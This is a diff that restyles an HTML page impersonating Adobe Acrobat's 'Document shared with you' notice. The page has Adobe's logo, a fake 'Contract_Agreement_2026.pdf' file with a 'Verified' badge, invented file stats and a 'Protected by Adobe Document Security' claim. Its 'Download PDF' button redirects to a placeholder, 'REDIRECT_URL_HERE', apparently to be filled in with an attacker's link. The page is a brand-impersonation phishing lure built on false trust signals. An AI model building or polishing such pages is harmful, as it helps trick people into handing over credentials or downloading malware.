@@ -16,7 +16,7 @@
 
         body {
             font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f8;
+            background: #f0f2f5;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -24,44 +24,41 @@
 
         /* Header */
         .header {
-            background: #ffffff;
-            height: 60px;
+            background: #fff;
+            height: 54px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 32px;
-            border-bottom: 1px solid #e5e5e5;
+            padding: 0 28px;
+            border-bottom: 1px solid #e2e2e2;
         }
 
         .brand {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
 
-        .adobe-logo {
-            width: 28px;
-            height: 24px;
+        .brand svg {
+            width: 24px;
+            height: 20px;
         }
 
-        .brand-name {
-            font-size: 17px;
+        .brand span {
+            font-size: 15px;
             font-weight: 700;
-            color: #1a1a1a;
+            color: #222;
         }
 
-        .header-link {
-            font-size: 14px;
+        .header a {
+            font-size: 13px;
             color: #1473e6;
             text-decoration: none;
-            font-weight: 500;
-            padding: 8px 18px;
-            border-radius: 6px;
-            transition: all 0.15s;
+            font-weight: 600;
         }
 
-        .header-link:hover {
-            background: #f0f7ff;
+        .header a:hover {
+            text-decoration: underline;
         }
 
         /* Main */
@@ -70,190 +67,186 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 48px 24px;
+            padding: 40px 20px;
         }
 
         .card {
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04), 0 12px 48px rgba(0,0,0,0.06);
-            max-width: 520px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 6px 24px rgba(0,0,0,0.05);
+            max-width: 480px;
             width: 100%;
             overflow: hidden;
         }
 
-        /* Blue banner */
-        .banner {
-            background: linear-gradient(135deg, #1473e6 0%, #0958b8 100%);
-            padding: 36px 40px;
+        /* Top accent */
+        .accent-bar {
+            background: linear-gradient(135deg, #1473e6, #0b5cbf);
+            padding: 28px 32px;
             text-align: center;
-            color: #ffffff;
+            color: #fff;
         }
 
-        .banner-icon {
-            width: 52px;
-            height: 52px;
-            background: rgba(255,255,255,0.18);
-            border-radius: 16px;
-            margin: 0 auto 16px;
+        .accent-bar .icon-wrap {
+            width: 44px;
+            height: 44px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 12px;
+            margin: 0 auto 12px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .banner-icon svg {
-            width: 28px;
-            height: 28px;
+        .accent-bar .icon-wrap svg {
+            width: 24px;
+            height: 24px;
         }
 
-        .banner h1 {
-            font-size: 22px;
+        .accent-bar h1 {
+            font-size: 19px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
 
-        .banner p {
-            font-size: 14px;
-            opacity: 0.85;
-            line-height: 1.5;
+        .accent-bar p {
+            font-size: 13px;
+            opacity: 0.8;
         }
 
-        /* Card body */
-        .card-body {
-            padding: 32px 40px 40px;
+        /* Body */
+        .body {
+            padding: 24px 32px 32px;
         }
 
-        /* File row */
         .file-row {
             display: flex;
             align-items: center;
-            gap: 16px;
-            padding: 18px;
-            background: #f9f9fb;
+            gap: 14px;
+            padding: 14px;
+            background: #fafafa;
             border: 1px solid #eee;
-            border-radius: 12px;
-            margin-bottom: 24px;
+            border-radius: 10px;
+            margin-bottom: 20px;
         }
 
-        .file-icon {
-            width: 48px;
-            height: 56px;
+        .file-row svg {
+            width: 40px;
+            height: 48px;
             flex-shrink: 0;
         }
 
-        .file-details {
+        .file-info {
             flex: 1;
             min-width: 0;
         }
 
-        .file-name {
-            font-size: 15px;
+        .file-info .name {
+            font-size: 14px;
             font-weight: 600;
             color: #1a1a1a;
             overflow: hidden;
             text-overflow: ellipsis;
             white-space: nowrap;
-            margin-bottom: 3px;
         }
 
-        .file-meta {
-            font-size: 12px;
-            color: #999;
-        }
-
-        .verified-badge {
-            background: #e6f4ea;
-            color: #1e7e34;
+        .file-info .meta {
             font-size: 11px;
+            color: #999;
+            margin-top: 2px;
+        }
+
+        .badge {
+            background: #e8f5e9;
+            color: #2e7d32;
+            font-size: 10px;
             font-weight: 600;
-            padding: 5px 12px;
-            border-radius: 12px;
-            white-space: nowrap;
+            padding: 4px 10px;
+            border-radius: 10px;
         }
 
         /* Stats */
         .stats {
             display: flex;
-            gap: 12px;
-            margin-bottom: 28px;
+            gap: 10px;
+            margin-bottom: 24px;
         }
 
         .stat {
             flex: 1;
             text-align: center;
-            padding: 14px 10px;
-            background: #f9f9fb;
-            border-radius: 10px;
+            padding: 12px 8px;
+            background: #fafafa;
+            border-radius: 8px;
         }
 
-        .stat-value {
-            font-size: 17px;
+        .stat .val {
+            font-size: 15px;
             font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 3px;
+            color: #222;
         }
 
-        .stat-label {
-            font-size: 11px;
-            color: #999;
+        .stat .lbl {
+            font-size: 10px;
+            color: #aaa;
             text-transform: uppercase;
-            letter-spacing: 0.4px;
+            letter-spacing: 0.3px;
+            margin-top: 2px;
         }
 
-        /* Action button */
-        .action-btn {
+        /* Button */
+        .dl-btn {
             width: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             background: #1473e6;
-            color: #ffffff;
+            color: #fff;
             border: none;
-            border-radius: 26px;
-            padding: 16px 28px;
-            font-size: 16px;
+            border-radius: 20px;
+            padding: 14px 24px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: background 0.2s;
         }
 
-        .action-btn:hover {
+        .dl-btn:hover {
             background: #0d66d0;
-            box-shadow: 0 6px 24px rgba(20, 115, 230, 0.25);
         }
 
-        .action-btn svg {
-            width: 20px;
-            height: 20px;
+        .dl-btn svg {
+            width: 18px;
+            height: 18px;
         }
 
-        .security-line {
+        .security-note {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #b0b0b0;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #b0b0b0;
+            gap: 5px;
         }
 
-        .security-line svg {
-            width: 15px;
-            height: 15px;
-            fill: #22a352;
+        .security-note svg {
+            width: 13px;
+            height: 13px;
+            fill: #4caf50;
         }
 
         /* Footer */
         .footer {
             text-align: center;
-            padding: 20px 24px;
-            font-size: 12px;
-            color: #b8b8b8;
+            padding: 16px;
+            font-size: 11px;
+            color: #bbb;
         }
 
         .footer a {
-            color: #b8b8b8;
+            color: #bbb;
             text-decoration: none;
         }
 
@@ -261,74 +254,69 @@
             text-decoration: underline;
         }
 
-        /* Print */
         @media print {
             body { background: #fff; }
-            .card { box-shadow: none; border: 1px solid #e0e0e0; }
-            .banner, .action-btn, .verified-badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .card { box-shadow: none; border: 1px solid #ddd; }
+            .accent-bar, .dl-btn, .badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
     <header class="header">
         <div class="brand">
-            <svg class="adobe-logo" viewBox="0 0 30 26" fill="none">
+            <svg viewBox="0 0 30 26" fill="none">
                 <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                 <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                 <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
             </svg>
-            <span class="brand-name">Adobe Acrobat</span>
+            <span>Adobe Acrobat</span>
         </div>
-        <a href="#" class="header-link">Sign in</a>
+        <a href="#">Sign in</a>
     </header>
 
-    <!-- Main -->
     <main class="main">
         <article class="card">
-            <!-- Banner -->
-            <div class="banner">
-                <div class="banner-icon">
+            <div class="accent-bar">
+                <div class="icon-wrap">
                     <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
                         <polyline points="14 2 14 8 20 8"/>
                     </svg>
                 </div>
                 <h1>Document shared with you</h1>
-                <p>Someone shared a PDF with you via Adobe Document Cloud</p>
+                <p>Via Adobe Document Cloud</p>
             </div>
 
-            <!-- Body -->
-            <div class="card-body">
+            <div class="body">
                 <div class="file-row">
-                    <svg class="file-icon" viewBox="0 0 48 56" fill="none">
-                        <path d="M0 4C0 1.79 1.79 0 4 0H30L48 18V52C48 54.21 46.21 56 44 56H4C1.79 56 0 54.21 0 52V4Z" fill="#FDEEEE"/>
-                        <path d="M30 0L48 18H34C31.79 18 30 16.21 30 14V0Z" fill="#F9CCCC"/>
-                        <text x="24" y="40" text-anchor="middle" fill="#EB1000" font-size="11" font-weight="700" font-family="sans-serif">PDF</text>
+                    <svg viewBox="0 0 40 48" fill="none">
+                        <path d="M0 4C0 1.79 1.79 0 4 0H24L40 16V44C40 46.21 38.21 48 36 48H4C1.79 48 0 46.21 0 44V4Z" fill="#FDEEEE"/>
+                        <path d="M24 0L40 16H28C25.79 16 24 14.21 24 12V0Z" fill="#F5CCCC"/>
+                        <text x="20" y="34" text-anchor="middle" fill="#EB1000" font-size="9" font-weight="700" font-family="sans-serif">PDF</text>
                     </svg>
-                    <div class="file-details">
-                        <div class="file-name">Contract_Agreement_2026.pdf</div>
-                        <div class="file-meta">Shared on Apr 14, 2026</div>
+                    <div class="file-info">
+                        <div class="name">Contract_Agreement_2026.pdf</div>
+                        <div class="meta">Shared Apr 14, 2026</div>
                     </div>
-                    <span class="verified-badge">Verified</span>
+                    <span class="badge">Verified</span>
                 </div>
 
                 <div class="stats">
                     <div class="stat">
-                        <div class="stat-value">3.6 MB</div>
-                        <div class="stat-label">File Size</div>
+                        <div class="val">3.6 MB</div>
+                        <div class="lbl">Size</div>
                     </div>
                     <div class="stat">
-                        <div class="stat-value">9</div>
-                        <div class="stat-label">Pages</div>
+                        <div class="val">9</div>
+                        <div class="lbl">Pages</div>
                     </div>
                     <div class="stat">
-                        <div class="stat-value">PDF 1.7</div>
-                        <div class="stat-label">Format</div>
+                        <div class="val">PDF 1.7</div>
+                        <div class="lbl">Format</div>
                     </div>
                 </div>
 
-                <button class="action-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
+                <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                         <polyline points="7 10 12 15 17 10"/>
@@ -337,7 +325,7 @@
                     Download PDF
                 </button>
 
-                <div class="security-line">
+                <div class="security-note">
                     <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                     Protected by Adobe Document Security
                 </div>
@@ -345,7 +333,6 @@
         </article>
     </main>
 
-    <!-- Footer -->
     <footer class="footer">
         &copy; 2026 Adobe. All rights reserved. &middot;
         <a href="#">Privacy</a> &middot;
